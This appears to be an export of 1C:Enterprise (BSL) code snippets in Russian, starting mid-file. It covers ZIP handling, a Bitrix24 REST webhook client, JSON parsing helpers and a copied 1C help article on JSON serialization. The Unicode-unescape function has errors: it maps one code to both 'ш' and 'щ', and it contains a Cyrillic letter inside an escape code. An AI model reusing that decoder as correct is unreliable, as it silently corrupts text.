	КонецПопытки;    
	Если стрОшибка <> """" Тогда
		стрОшибка = Сред(стрОшибка, 3)+"" кнопка, которую требуется нажать"";
		ВызватьИсключение(стрОшибка);
	КонецЕсли;    
	
	Если ТипЗнч(Кнопка) = Тип(""КнопкаКоманднойПанели"") Тогда
		Действие = Кнопка.Действие;
	ИначеЕсли ТипЗнч(Кнопка) = Тип(""Кнопка"") Тогда    
		Действие = Кнопка.ПолучитьДействие(""Нажатие"");
	КонецЕсли;    
	буфДействие = ФормаКнопки.ПолучитьДействие(""ПриПовторномОткрытии"");
	ФормаКнопки.УстановитьДействие(""ПриПовторномОткрытии"", Действие);
	Попытка
		// собственно вызов нажатия кнопки
		ФормаКнопки.Открыть();
		ФормаКнопки.УстановитьДействие(""ПриПовторномОткрытии"", буфДействие);
	Исключение    
		ФормаКнопки.УстановитьДействие(""ПриПовторномОткрытии"", буфДействие);
		ВызватьИсключение;
	КонецПопытки;    
КонецПроцедуры"}
}
},
{2,
{"АрхивZip",1,0,"",""},
{0,
{"РаспаковатьZIPАрхив",0,0,"","Функция РаспаковатьZIPАрхив(СтрокаZIP) Экспорт
	
	СтрокаСодержимого = ""ZIP_ERROR"";
	
	ИмяФайла    = ПолучитьИмяВременногоФайла(""zip"");
	ИмяКаталога = КаталогВременныхФайлов() + Строка(Новый УникальныйИдентификатор);
	СоздатьКаталог(ИмяКаталога);
	
	СтрокаВФайл = Новый ТекстовыйДокумент;
	СтрокаВФайл.УстановитьТекст(СтрокаZIP);
	Попытка
		СтрокаВФайл.Записать(ИмяФайла);
	Исключение
	КонецПопытки;
	
	ЧтениеZIP = Новый ЧтениеZIPФайла(ИмяФайла);
	ЧтениеZIP.ИзвлечьВсе(ИмяКаталога);
	ЧтениеZIP.Закрыть();
	
	РаспакованныеФайлы = НайтиФайлы(ИмяКаталога, ""*.xml"");
	
	Если РаспакованныеФайлы.Количество() = 1 Тогда
		СтрокаИзФайла 	  = Новый ТекстовыйДокумент;
		СтрокаИзФайла.Прочитать(РаспакованныеФайлы[0].ПолноеИмя);
		СтрокаСодержимого = СтрокаИзФайла.ПолучитьТекст();
	КонецЕсли;
	
	Попытка
		УдалитьФайлы(ИмяФайла);
		УдалитьФайлы(ИмяКаталога);
	Исключение
	КонецПопытки;
	
	Возврат СтрокаСодержимого;
	
КонецФункции"}
},
{0,
{"Архив (из Б24)",0,0,"","ПолноеИмяФайлаАрхива = ПолучитьПутьДляПлатформы(ПараметрыОбмена.ПлатформаWindows, ПараметрыОбмена.КаталогЛога + ""\reports\"" + ""Exchange_"" + ""("" + ПараметрыОбмена.ссылка.Наименование +  "")"" +  СокрЛП(Формат(ТекущаяДата(), ""ДФ=yyyy-MM-dd"")) + "".zip"");
ЗаписьАрхива = Новый ЗаписьZipФайла(ПолноеИмяФайлаАрхива);
НовыйСписокФайлов = Новый СписокЗначений;
ЗаписьАрхива.Добавить(ПолучитьПутьДляПлатформы(ПараметрыОбмена.ПлатформаWindows, ПараметрыОбмена.КаталогЛога + ""\reports\"" + ""Exchange_"" + ""("" + ПараметрыОбмена.ссылка.Наименование +  "")"" +  СокрЛП(Формат(ТекущаяДата(), ""ДФ=yyyy-MM-dd"")) + "".txt""));

Если ПараметрыОбмена.ХранитьФайлыОбменаНаСайте тогда
	МассивПодкаталогов = Новый Массив;
	МассивПодкаталогов.Добавить(СокрЛП(ПараметрыОбмена.ссылка.Код));
	
	ИмяАрхиваОбмена = ПолучитьПутьДляПлатформы(ПараметрыОбмена.ПлатформаWindows, ПараметрыОбмена.КаталогЛога + ""\reports\Exchange.zip"");
	
	СписокАрхивов 	= ПолучитьСписокZIPАрхивов(ПараметрыОбмена, ПолучитьПутьДляПлатформы(ПараметрыОбмена.ПлатформаWindows, ПараметрыОбмена.КаталогЛога + ""\reports""), МассивПодкаталогов, ИмяАрхиваОбмена);
	
	Если СписокАрхивов.Количество() > 0 тогда
		ЗаписьАрхива.Добавить(СписокАрхивов[0].значение);
	КонецЕсли;
КонецЕсли;
Попытка
	ЗаписьАрхива.Записать();
Исключение
	СообщитьПодробно(""Не удалось записать zip-архив на диск!"", ПараметрыОбмена);	
КонецПопытки;"}
}
},
{5,
{"Древовидные форматы",1,0,"",""},
{6,
{"Json",1,0,"",""},
{0,
{"Получить результат от сервера",0,0,"","Функция УстановитьСоединениеССервером(ПараметрыПодключения) 
	
	Соединение = Неопределено;
	
	Попытка
		
		Если НЕ ПараметрыПодключения.ЗащищенноеСоединение тогда
			ssl = Неопределено;
		Иначе
			
			ssl = Новый ЗащищенноеСоединениеOpenSSL(
			Неопределено,
			Неопределено);   
			
		КонецЕсли;
		
		Соединение = Новый HTTPСоединение(ПараметрыПодключения.Сервер, ПараметрыПодключения.Порт,,, ПараметрыПодключения.Прокси, ,ssl);
		
	Исключение
		
		Сообщить(НСтр(""ru = 'Не удалось установить соединение с серовером'"") + ПараметрыПодключения.Сервер + "":"" + Строка(ПараметрыПодключения.Порт) 
		+ НСтр(""ru = '.Проверьте правильность адреса сервера, порт, имя пользователя и пароль.'""));
		
		Соединение = Неопределено;
		
	КонецПопытки;
	
	Возврат Соединение;
	
КонецФункции

Функция ВызватьМетод(Метод, ПараметрыСтрокой) Экспорт
	
	СтруктрураВозврата = Новый Структура(""ЕстьОшибки, ОписаниеОшибки"", Ложь, """");
		
	НастройкиПодключения = Новый Структура;
	Соединение = Неопределено;
	
	Если НЕ ДобавлениеНастроекПодключения(НастройкиПодключения, Соединение) тогда
		
		СтруктрураВозврата.ОписаниеОшибки = ""Не удалось получить все данные для подключения"";
		СтруктрураВозврата.ЕстьОшибки = Истина;
		Возврат СтруктрураВозврата;

	КонецЕсли;
		
	Соединение = УстановитьСоединениеССервером(НастройкиПодключения);
		
	Если Соединение = Неопределено Тогда
			
		СтруктрураВозврата.ОписаниеОшибки = ""Авторизация не выполнена"";
		СтруктрураВозврата.ЕстьОшибки = Истина;
		Возврат СтруктрураВозврата;
			
	КонецЕсли;
		
	ОписаниеОшибки	= """";
	
	//	========================================================================
	HTTPЗапрос = Новый HTTPЗапрос;
	HTTPЗапрос.АдресРесурса = ""/rest/"" 
							+ НастройкиПодключения.ИДПользователяВэбХука + ""/""
							+ НастройкиПодключения.Токен + ""/""
							+ Метод + ""/"";
							
	HTTPЗапрос.УстановитьТелоИзСтроки(ПараметрыСтрокой);
	
	
	//	========================================================================
	ИмяФайлаОтвета = ПолучитьИмяВременногоФайла(""txt"");
	//ИмяФайлаОтвета = ""C:\Users\db3\Documents\2018-05-14 двусторонний обмен\Bitrix24.txt"";
	
	Попытка
		
		HTTPОтвет = Соединение.ОтправитьДляОбработки(HTTPЗапрос, ИмяФайлаОтвета);
		
	Исключение
		
		СтруктрураВозврата.ОписаниеОшибки = ОписаниеОшибки();
		СтруктрураВозврата.ЕстьОшибки = Истина;
		Возврат СтруктрураВозврата;
				
	КонецПопытки;
	
	//сообщить(ИмяФайлаОтвета);
	
	ФайлОтвета 		= Новый Файл(ИмяФайлаОтвета);
	ОтветСервера 	= Неопределено;
	
	Если НЕ ФайлОтвета.Существует() Тогда
		
		СтруктрураВозврата.ОписаниеОшибки = ""Получение данных с сервера: Ответ сервера не получен."";
		СтруктрураВозврата.ЕстьОшибки = Истина;
		Возврат СтруктрураВозврата;
		
	КонецЕсли;
	
	ЧтениниеТекста = Новый ЧтениеТекста(ИмяФайлаОтвета);
	ТекстОтвета = ЧтениниеТекста.Прочитать();
	ЧтениниеТекста.Закрыть();
	
	//	========================================================================
	Попытка
		ЧтениеОтвета = Новый ЧтениеJSON;
		ЧтениеОтвета.УстановитьСтроку(ТекстОтвета);
		ДанныеОтвета = ПрочитатьJSON(ЧтениеОтвета);
		Если ДанныеОтвета.Свойство(""result"") Тогда
			
			СтруктрураВозврата.Вставить(""result"",ДанныеОтвета.result);
			
		ИначеЕсли ДанныеОтвета.Свойство(""error"") Тогда
			
			СтруктрураВозврата.ОписаниеОшибки = ДанныеОтвета.error_description;
			СтруктрураВозврата.ЕстьОшибки = Истина;
			Возврат СтруктрураВозврата;
			
		Иначе
			
			СтруктрураВозврата.ОписаниеОшибки = ""Непредвиденная ошибка"";
			СтруктрураВозврата.ЕстьОшибки = Истина;
			Возврат СтруктрураВозврата;
			
		КонецЕсли; 
	Исключение
		СтруктрураВозврата.ОписаниеОшибки = ""Получение данных с сервера: Ошибка разбора ответа сервера"";
		СтруктрураВозврата.ЕстьОшибки = Истина;
		Возврат СтруктрураВозврата;
	КонецПопытки; 
		
	Попытка
		//УдалитьФайлы(ИмяФайлаОтвета);
	Исключение
		;
	КонецПопытки;
	
	Возврат СтруктрураВозврата;
	
КонецФункции

"}
},
{0,
{"ДесериализоватьИзJSON",0,0,"","Функция ДесериализоватьИзJSON(СтрокаJSON)
	
	ЧтениеJSON = Новый ЧтениеJSON;
	ЧтениеJSON.УстановитьСтроку(СтрокаJSON);
	Строка = ПрочитатьJSON(ЧтениеJSON);
	
	Возврат Строка;
	//	Строка.result[0].ID
	
КонецФункции"}
},
{0,
{"РаскодироватьJSON",0,0,"","Функция РаскодироватьJSON(URL) Экспорт

	Результат = URL; 
	
	СписокСимволов = Новый СписокЗначений;
	СписокСимволов.Добавить(""\u0430"", ""а"");
	СписокСимволов.Добавить(""\u0431"", ""б"");
	СписокСимволов.Добавить(""\u0432"", ""в"");
	СписокСимволов.Добавить(""\u0433"", ""г"");
	СписокСимволов.Добавить(""\u0434"", ""д"");
	СписокСимволов.Добавить(""\u0435"", ""е"");
	СписокСимволов.Добавить(""\u0451"", ""ё"");
	СписокСимволов.Добавить(""\u0436"", ""ж"");
	СписокСимволов.Добавить(""\u0437"", ""з"");
	СписокСимволов.Добавить(""\u0438"", ""и"");
	СписокСимволов.Добавить(""\u0439"", ""й"");
	СписокСимволов.Добавить(""\u043a"", ""к"");
	СписокСимволов.Добавить(""\u043b"", ""л"");
	СписокСимволов.Добавить(""\u043c"", ""м"");
	СписокСимволов.Добавить(""\u043d"", ""н"");
	СписокСимволов.Добавить(""\u043e"", ""о"");
	СписокСимволов.Добавить(""\u043f"", ""п"");
	СписокСимволов.Добавить(""\u0440"", ""р"");
	СписокСимволов.Добавить(""\u0441"", ""с"");
	СписокСимволов.Добавить(""\u0442"", ""т"");
	СписокСимволов.Добавить(""\u0443"", ""у"");
	СписокСимволов.Добавить(""\u0444"", ""ф"");
	СписокСимволов.Добавить(""\u0445"", ""х"");
	СписокСимволов.Добавить(""\u0446"", ""ц"");
	СписокСимволов.Добавить(""\u0447"", ""ч"");
	СписокСимволов.Добавить(""\u0448"", ""ш"");
	СписокСимволов.Добавить(""\u0448"", ""щ"");
	СписокСимволов.Добавить(""\u044a"", ""ъ"");
	СписокСимволов.Добавить(""\u044b"", ""ы"");
	СписокСимволов.Добавить(""\u044c"", ""ь"");
	СписокСимволов.Добавить(""\u044d"", ""э"");
	СписокСимволов.Добавить(""\u044e"", ""ю"");
	СписокСимволов.Добавить(""\u044f"", ""я"");
	
	СписокСимволов.Добавить(""\u0410"", ""А"");
	СписокСимволов.Добавить(""\u0411"", ""Б"");
	СписокСимволов.Добавить(""\u0412"", ""В"");
	СписокСимволов.Добавить(""\u0413"", ""Г"");
	СписокСимволов.Добавить(""\u0414"", ""Д"");
	СписокСимволов.Добавить(""\u0415"", ""Е"");
	СписокСимволов.Добавить(""\u0401"", ""Ё"");
	СписокСимволов.Добавить(""\u0416"", ""Ж"");
	СписокСимволов.Добавить(""\u0417"", ""З"");
	СписокСимволов.Добавить(""\u0418"", ""И"");
	СписокСимволов.Добавить(""\u0419"", ""Й"");
	СписокСимволов.Добавить(""\u041a"", ""К"");
	СписокСимволов.Добавить(""\u041b"", ""Л"");
	СписокСимволов.Добавить(""\u041c"", ""М"");
	СписокСимволов.Добавить(""\u041d"", ""Н"");
	СписокСимволов.Добавить(""\u041e"", ""О"");
	СписокСимволов.Добавить(""\u041f"", ""П"");
	СписокСимволов.Добавить(""\u0420"", ""Р"");
	СписокСимволов.Добавить(""\u0421"", ""С"");
	СписокСимволов.Добавить(""\u0422"", ""Т"");
	СписокСимволов.Добавить(""\u0423"", ""У"");
	СписокСимволов.Добавить(""\u0424"", ""Ф"");
	СписокСимволов.Добавить(""\u0425"", ""Х"");
	СписокСимволов.Добавить(""\u0426"", ""Ц"");
	СписокСимволов.Добавить(""\u0427"", ""Ч"");
	СписокСимволов.Добавить(""\u0428"", ""Ш"");
	СписокСимволов.Добавить(""\u0428"", ""Щ"");
	СписокСимволов.Добавить(""\u042a"", ""Ъ"");
	СписокСимволов.Добавить(""\u042b"", ""Ы"");
	СписокСимволов.Добавить(""\u042c"", ""Ь"");
	СписокСимволов.Добавить(""\u042d"", ""Э"");
	СписокСимволов.Добавить(""\u042e"", ""Ю"");
	СписокСимволов.Добавить(""\u042f"", ""Я"");
	
	
	СписокСимволов.Добавить(""\u0022"", ""'"");
	
	СписокСимволов.Добавить(""\u003E"", "">"");
	СписокСимволов.Добавить(""\u003е"", "">"");
	
	СписокСимволов.Добавить(""\u003C"", ""<"");
	СписокСимволов.Добавить(""\u003c"", ""<"");
	
	Для Каждого текЭлемент из СписокСимволов Цикл
		
		Результат = СтрЗаменить(Результат, текЭлемент.Значение, текЭлемент.Представление);	
		
	КонецЦикла;

    Возврат Результат;
	
КонецФункции"}
},
{0,
{"Сериализация и десериализация JSON",0,0,"","Сериализация и десериализация JSON
JSON (JavaScript Object Notation) - это универсальный текстовый формат представления данных, который используется для обмена данными между приложениями. Для работы с данным форматом во многих популярных языках программирования доступны специальные объекты, функции. Если преобразовать объект в данный формат, то текст будет понятным для чтения человеком. Данный текст можно просмотреть в любом текстовом редакторе.

Сериализация JSON может быть использована вместо функций ""ЗначениеВСтрокуВнутр()"" и ""ЗначениеИзСтрокиВнутр()"".

Преимуществом данного формата является лаконичность представления данных. Данные представленные в JSON, в отличии от XML, занимают меньший объем. Сериализация и десериализация выполняется быстрее чем с XML.

Вариант 1

Начиная с версии 1С:Предприятие 8.3.7.1759, объект СериализаторXDTO поддерживает сериализацию и десериализацию JSON. Это означает, что любой объект 1С:Предприятия (объект конфигурации или объект встроенного языка) можно автоматически сериализовать и десериализовать.

Процедура ЗаписьJSON()
	
	ЗаписьJSON = Новый ЗаписьJSON;
	//Или в строку
	ЗаписьJSON.УстановитьСтроку();
	//Или в файл
	ЗаписьJSON.ОткрытьФайл(""C:\test.txt"");
	 
	Номенклатура = Справочники.Номенклатура.НайтиПоКоду(""00000000001"").ПолучитьОбъект();
	СериализаторXDTO.ЗаписатьJSON(ЗаписьJSON, Номенклатура, НазначениеТипаXML.Явное);
	
	СериализованнаяСтрока = ЗаписьJSON.Закрыть();
	
КонецПроцедуры


Процедура ЧтениеJSON()
	
	ЧтениеJSON = Новый ЧтениеJSON;
	//Или из строки
	ЧтениеJSON.УстановитьСтроку("""");
	//Или из файла	
	ЧтениеJSON.ОткрытьФайл(""C:\test.txt"");
		
	Номенклатура = СериализаторXDTO.ПрочитатьJSON(ЧтениеJSON);	
	
	ЧтениеJSON.Закрыть();
		
КонецПроцедуры 


Вариант 2

ЗаписатьJSON() - это метод глобального контекста, который позволяет сериализовать значения следующих типов: Строка, Число, Булево, Дата, Массив, ФиксированныйМассив, Структура, ФиксированнаяСтруктура, Соответствие, ФиксированноеСоответствие. С помощью метода глобального контекста ПрочитатьJSON(), можно десериализовать значения этих же типов.

Процедура ЗаписьJSON()
	
	ЗаписьJSON = Новый ЗаписьJSON;
	//Или в строку
	ЗаписьJSON.УстановитьСтроку();
	//Или в файл
	ЗаписьJSON.ОткрытьФайл(""C:\test.txt"");
	 
	//Запись структуры
	Структура = Новый Структура; 
	Структура.Вставить(""Поле1"", ""Значение1""); 	
	Структура.Вставить(""Поле2"", ""Значение2"");
	Структура.Вставить(""Поле3"", ""Значение3"");
	ЗаписатьJSON(ЗаписьJSON, Структура);
		
	СериализованнаяСтрока = ЗаписьJSON.Закрыть();
	
КонецПроцедуры


Процедура ЧтениеJSON()
	
	ЧтениеJSON = Новый ЧтениеJSON;
	//Или из строки
	ЧтениеJSON.УстановитьСтроку("""");
	//Или из файла	
	ЧтениеJSON.ОткрытьФайл(""C:\test.txt"");
		
	Структура = ПрочитатьJSON(ЧтениеJSON);	
	
	ЧтениеJSON.Закрыть();
		
КонецПроцедуры 


Вариант 3

Данный вариант сериализации и десериализации выполняется полностью в ручном режиме, без использования специальных объектов сериализации встроенного языка. Чтение и запись сериализованных данных выполняется с помощью объектов ЗаписьJSON, ЧтениеJSON. Эти объекты не считывают файл целиком, а считывают поэлементно, поэтому расходуют меньше памяти компьютера.

Процедура ЗаписьJSON()
	 
	ЗаписьJSON = Новый ЗаписьJSON;
	//Или в строку
	ЗаписьJSON.УстановитьСтроку();
	//Или в файл
	ЗаписьJSON.ОткрытьФайл(""C:\test.txt"");
				
	ЗаписьJSON.ЗаписатьНачалоМассива();
		
			ЗаписьJSON.ЗаписатьЗначение(""Значение1"");
			ЗаписьJSON.ЗаписатьЗначение(""Значение2"");
			ЗаписьJSON.ЗаписатьЗначение(""Значение3"");
			
			ЗаписьJSON.ЗаписатьНачалоОбъекта();
			
				ЗаписьJSON.ЗаписатьИмяСвойства(""Свойство1"");
				ЗаписьJSON.ЗаписатьЗначение(""Значение1"");
				ЗаписьJSON.ЗаписатьИмяСвойства(""Свойство2"");
				ЗаписьJSON.ЗаписатьЗначение(""Значение2"");
					
			ЗаписьJSON.ЗаписатьКонецОбъекта();
			
		ЗаписьJSON.ЗаписатьКонецМассива();
				
	СериализованнаяСтрока = ЗаписьJSON.Закрыть();
	
КонецПроцедуры


Процедура ЧтениеJSON()
	
	ЧтениеJSON = Новый ЧтениеJSON;
	//Или из строки
	ЧтениеJSON.УстановитьСтроку("""");
	//Или из файла	
	ЧтениеJSON.ОткрытьФайл(""C:\test.txt"");
		
	Пока ЧтениеJSON.Прочитать() Цикл
	
		Если ЧтениеJSON.ТипТекущегоЗначения = ТипЗначенияJSON.НачалоМассива Тогда
		
			Пока ЧтениеJSON.Прочитать() Цикл
				
				Если ЧтениеJSON.ТипТекущегоЗначения = ТипЗначенияJSON.Строка Тогда	
					Сообщить(""Значение: "" + ЧтениеJSON.ТекущееЗначение);	
					
				ИначеЕсли ЧтениеJSON.ТипТекущегоЗначения = ТипЗначенияJSON.НачалоОбъекта Тогда
					
					Пока ЧтениеJSON.Прочитать() Цикл	
						
						Если ЧтениеJSON.ТипТекущегоЗначения = ТипЗначенияJSON.ИмяСвойства Тогда
							Сообщить(""Свойство: "" + ЧтениеJSON.ТекущееЗначение);	
							
						ИначеЕсли ЧтениеJSON.ТипТекущегоЗначения = ТипЗначенияJSON.Строка Тогда
							Сообщить(""Значение: "" + ЧтениеJSON.ТекущееЗначение);
							
						КонецЕсли;
						
					КонецЦикла;
					
				КонецЕсли;
				
			КонецЦикла;
			
		КонецЕсли;
		
	КонецЦикла;
	
	ЧтениеJSON.Закрыть();
	
КонецПроцедуры "}
},
{0,
{"Парсер JSON (Штатные средства 1С 8.3.6)",0,0,"","//https://infostart.ru/public/551972/

// JSON парсер.
&НаКлиенте
Функция ПрочитатьJSONИзФайла(Значение, Стандарт = Истина, ПредставленияСсылок = Ложь) Экспорт 
    
    Попытка
        ЧтениеJSON = Новый ЧтениеJSON;
        ЧтениеJSON.Закрыть();
        
        Возврат jsonПрочитатьПлатформой(Значение);
    Исключение
        Возврат jsonПрочитатьИнициализация(Значение, Стандарт, ПредставленияСсылок);
    КонецПопытки;
    
КонецФункции // ПрочитатьJSON()

&НаКлиенте
Функция jsonПрочитатьПлатформой(Значение)

    ЧтениеJSON = Новый ЧтениеJSON;
    ЧтениеJSON.УстановитьСтроку(Значение);
    
    Результат = Неопределено;
    СформироватьДерево(ЧтениеJSON, Результат);
    
    ЧтениеJSON.Закрыть();
    
    Возврат Результат;

КонецФункции

&НаКлиенте
Процедура СформироватьДерево(ЧтениеJSON, Дерево)
    
    ИмяСвойства = Неопределено;
    
    Пока ЧтениеJSON.Прочитать() Цикл
        TипJSON = ЧтениеJSON.ТипТекущегоЗначения;
        
        Если TипJSON = ТипЗначенияJSON.НачалоОбъекта 
        ИЛИ TипJSON = ТипЗначенияJSON.НачалоМассива Тогда
            НовыйОбъект = ?(TипJSON = ТипЗначенияJSON.НачалоОбъекта, Новый Соответствие, Новый Массив);
            
            Если ТипЗнч(Дерево) = Тип(""Массив"") Тогда
                Дерево.Добавить(НовыйОбъект);
            ИначеЕсли ТипЗнч(Дерево) = Тип(""Соответствие"") И ЗначениеЗаполнено(ИмяСвойства) Тогда
                Дерево.Вставить(ИмяСвойства, НовыйОбъект);
            КонецЕсли;
            
            СформироватьДерево(ЧтениеJSON, НовыйОбъект);
            
            Если Дерево = Неопределено Тогда
                Дерево = НовыйОбъект;
            КонецЕсли;
        ИначеЕсли TипJSON = ТипЗначенияJSON.ИмяСвойства Тогда
            ИмяСвойства = ЧтениеJSON.ТекущееЗначение;
        ИначеЕсли TипJSON = ТипЗначенияJSON.Число 
        ИЛИ TипJSON = ТипЗначенияJSON.Строка 
        ИЛИ TипJSON = ТипЗначенияJSON.Булево 
        ИЛИ TипJSON = ТипЗначенияJSON.Null Тогда
            Если ТипЗнч(Дерево) = Тип(""Массив"") Тогда
                Дерево.Добавить(ЧтениеJSON.ТекущееЗначение);
            ИначеЕсли ТипЗнч(Дерево) = Тип(""Соответствие"") Тогда
                Дерево.Вставить(ИмяСвойства, ЧтениеJSON.ТекущееЗначение);
            КонецЕсли;
        Иначе
            Возврат;
        КонецЕсли;
    КонецЦикла;
    
КонецПроцедуры"}
},
{0,
{"Родная справка 1С (http://v8.1c.ru/o7/201410json/index.htm)",0,0,"","//http://v8.1c.ru/o7/201410json/index.htm

JSON (JavaScript Object Notation) это текстовый формат обмена данными, широко используемый в веб-приложениях. По сравнению с XML он является более лаконичным и занимает меньше места. Кроме этого все браузеры имеют встроенные средства для работы с JSON.

Необходимость работы с этим форматом на уровне платформы обусловлена не только тем, что это «модный современный» формат, который прикладные решения 1С:Предприятия сами по себе могут использовать для интеграции со сторонними приложениями. Другая причина заключается ещё и в том, что JSON активно используется в HTTP интерфейсах. А в 1С:Предприятии как раз есть такие механизмы, в которых хочется использовать этот формат. Это REST интерфейс приложения, автоматически генерируемый платформой, и HTTP-сервисы, которые вы можете создавать самостоятельно.

Мы видим несколько основных сценариев использования JSON.

Во-первых, это интеграция с внешними системами через их HTTP интерфейсы: Google Calendar, Salesforce.com, REST интерфейс 1С:Предприятия, SharePoint и т.д.

Во-вторых, это организация собственного HTTP интерфейса прикладного решения.

В-третьих, обмен файлами JSON с внешними системами. Формирование конфигурационных, настроечных файлов. Использование их в процедурах обмена данными, например, с интернет-магазинами.

В-четвертых, это использование файлов JSON для обмена данными между разными приложениями 1С:Предприятия.

В платформе мы реализовали несколько слоёв работы с JSON. Самые простые и гибкие - это низкоуровневые средства потоковой записи и чтения. Более высокоуровневые и не такие универсальные - средства сериализации в JSON примитивных типов и коллекций 1С:Предприятия.

Потоковое чтение и запись JSON
Объекты потоковой работы - это общие объекты ЧтениеJSON и ЗаписьJSON. Они последовательно читают JSON из файла или строки, или последовательно записывают JSON в файл или строку. Таким образом, чтение и запись JSON происходят без формирования всего документа в памяти.

В качестве иллюстрации потокового чтения JSON можно привести следующий пример:


При записи JSON вы самостоятельно формируете его структуру. Чтобы «подстраховать» вас от ошибок, объект ЗаписьJSON автоматически проверяет правильность записываемой структуры. Для увеличения скорости работы эту проверку можно отключить. В примере ниже это строка:


Также при записи вы можете управлять некоторыми параметрами формируемого текста, например использованием двойных кавычек, переносом строк, символами отступа и экранированием символов. В примере ниже для форматирования текста используется символ табуляции:


Потоковая запись JSON может выглядеть следующим образом. Записывается массив из четырёх элементов. Три из них примитивного типа, а четвёртый элемент - это объект с двумя свойствами:


Результат такой записи:

{
	""СвойствоТипаМассив"": [
		""Значение строка"",
		1.2345E1,
		true,
		{
			""СвойствоТипаСтрока"": ""Значение строка"",
			""СвойствоТипаНеопределено"": null
		}
	]
}
Сериализация примитивных типов и коллекций в JSON
Вторая группа средств работы с JSON хороша тем, что избавляет вас от рутинной работы по чтению/записи каждого отдельного значения или свойства. При чтении документы JSON отображаются в фиксированный набор типов платформы: Строка, Число, Булево, Неопределено, Массив, ФиксированныйМассив, Структура, ФиксированнаяСтруктура, Соответствие, Дата. Соответственно, в обратную сторону, композиция объектов этих типов позволяет сформировать в памяти и быстро записать в файл структуру JSON. Таким образом, чтение и запись небольшого объема JSON заранее известной структуры можно производить немногими строчками кода.

Основное назначение этих средств мы видим в обмене информацией с внешними системами, чтении конфигурационных файлов в формате JSON.

Сериализацию вы можете выполнять с помощью методов глобального контекста ПрочитатьJSON() и ЗаписатьJSON(). Они работают в связке с объектами ЧтениеJSON и ЗаписьJSON.

В качестве примера десериализации JSON можно рассмотреть чтение массива из двух объектов:

[
	{
		""имя"": ""Anton"",
		""фамилия"": ""Иванов"",
		""возраст"": 25
	},
	{
		""имя"": ""Ирина"",
		""фамилия"": ""Иванова"",
		""возраст"": 20
	}
]
Код 1С:Предприятия, выполняющий десериализацию, может выглядеть следующим образом:


А пример сериализации (записи) в JSON может выглядеть так:


Результат записи:

{
	""Фамилия"": ""Иванов"",
	""Имя"": ""Иван"",
	""Отчество"": ""Иванович"",
	""Возраст"": 40,
	""Женат"": true,
	""Телефоны"": [
		""8-999-999-99-90"",
		""8-999-999-99-91""
	]
}
Функции преобразования и восстановления при сериализации
Не всегда сериализация может быть выполнена полностью автоматически. В жизни встречаются самые разные ситуации. Поэтому мы добавили возможность использовать «самописную» функцию обработки значений при записи в JSON и при чтении из JSON.

В методе ЗаписатьJSON() она называется Функция преобразования и описывается с помощью трёх параметров:

ИмяФункцииПреобразования;
МодульФункцииПреобразования;
ДополнительныеПараметрыФункцииПреобразования.
В методе ПрочитатьJSON() она называется Функция восстановления и для неё есть аналогичные параметры:

ИмяФункцииВосстановления;
МодульФункцииВосстановления;
ДополнительныеПараметрыФункцииВосстановления.
При записи в JSON эта функция полезна потому, что позволяет самостоятельно преобразовать в JSON те типы, которые не подлежат автоматическому преобразованию. Или даже совсем отказаться от их сериализации.

Например, так оказалось, что в записываемой структуре одно из значений - это ссылка на элемент справочника ПодразделенияОрганизаций. Такое значение (ссылка на объект 1С:Предприятия) не может быть автоматически сериализовано средствами платформы. Тогда, используя функцию преобразования, мы можем получить для этого значения его строковое представление в удобном виде. Например, в виде строки «ИП Петров: Отдел рекламы».


Результат выполнения примера:

{
	""Фамилия"": ""Иванов"",
	""Имя"": ""Иван"",
	""Отчество"": ""Иванович"",
	""Подразделение"": ""ИП Петров: Отдел рекламы"",
	""Телефоны"": [
		""8-999-999-99-90"",
		""8-999-999-99-91""
	]
}
При чтении из JSON функция восстановления может использоваться для того, чтобы преобразовать данные JSON в типы 1С, которые не могут являться результатом автоматического преобразования, или для того, чтобы самостоятельно (не автоматически) преобразовать даты JSON в даты 1С:Предприятия.

Сериализация типа Дата
Данные типа Дата сериализуются в JSON автоматически, а вот обратное преобразование (десериализация) может быть выполнено не всегда. JSON не содержит типа Дата, значения даты представляются в нём строкой. Конечно, существуют некоторые форматы представления дат, но вообще говоря, внешний вид такой строки может быть самым разнообразным.

Для сериализации типа Дата в JSON у метода ЗаписатьJSON() вы можете использовать параметр НастройкиСериализации. Это объект встроенного языка, который позволяет указать, в каком варианте будет записана дата (UTC, локальная дата или локальная дата со смещением) и в каком формате (ISO, JavaScript или Microsoft).

Код 1С:Предприятия:



Текст JSON:

[
	{
		""Фамилия"": ""Иванов"",
		""ДатаРождения"": ""1987-05-14T00:00:00""
	},
	{
		""Фамилия"": ""Петров"",
		""ДатаРождения"": ""1993-11-21T00:00:00""
	}
]
При чтении даты из JSON всё обстоит сложнее. В параметре ИменаСвойствСоЗначениямиДата вы можете перечислить те свойства JSON, значения которых нужно преобразовать в дату 1С:Предприятия (тип Дата). А в параметре ОжидаемыйФорматДаты вам нужно указать, в каком формате эти данные содержатся в JSON (ISO, JavaScript или Microsoft).

Текст JSON:

[
	{
		""Фамилия"": ""Иванов"",
		""ДатаРождения"": ""1987-05-14T00:00:00""
	},
	{
		""Фамилия"": ""Петров"",
		""ДатаРождения"": ""1993-11-21T00:00:00""
	}
]
Код 1С:Предприятия:


Однако если окажется, что в какой-то момент формат данных JSON не совпадает с ожидаемым форматом, будет вызвано исключение.

В такой ситуации, для большей универсальности, вы можете включить те же самые свойства JSON в массив, подлежащий обработке функцией восстановления - ИменаСвойствДляОбработкиВосстановления. И уже в функции восстановления вы самостоятельно десериализуете даты JSON, в каком бы формате они ни были представлены.

Использование JSON в HTTP интерфейсах приложений
Автоматически генерируемый REST интерфейс прикладных решений
При обращении к REST интерфейсу прикладного решения вы можете получать ответ в формате JSON. Для этого в адресной строке вам нужно указать параметр $format=json. Либо указать MIME тип ""application/json"" в заголовке Accept HTTP запроса. Например:

Запрос:

GET /TestInfobase/odata/standard.odata/СправочникДляТестов?$format=json HTTP/1.1
MaxDataServiceVersion: 3.0;NetFx
Accept: application/json
Accept-Charset: UTF-8
User-Agent: Microsoft ADO.NET Data Services
Ответ:

HTTP/1.1 200 OK
Content-Length: 9429
Content-Type: application/json;charset=utf-8
Server: Microsoft-IIS/7.5
DataServiceVersion: 3.0
X-Powered-By: ASP.NET
Date: Mon, 12 Aug 2013 09:44:07 GMT
    
{
""odata.metadata"":""http://host/svc/$metadata#СправочникДляТестов"",
""value"":[
{
	""Ref_Key"":guid'cc6a7df3-8cfe-11dc-8ca0-000d8843cd1b',
	""DataVersion"":""AAAAAQAAAAE"",	
	""DeletionMark"":false,
	""Parent_Key"":guid'bbb079ae-8c51-11db-a9b0-00055d49b45e',
	""IsFolder"":false,
	""Code"":000000025,
	""Description"":""Пинетки"",
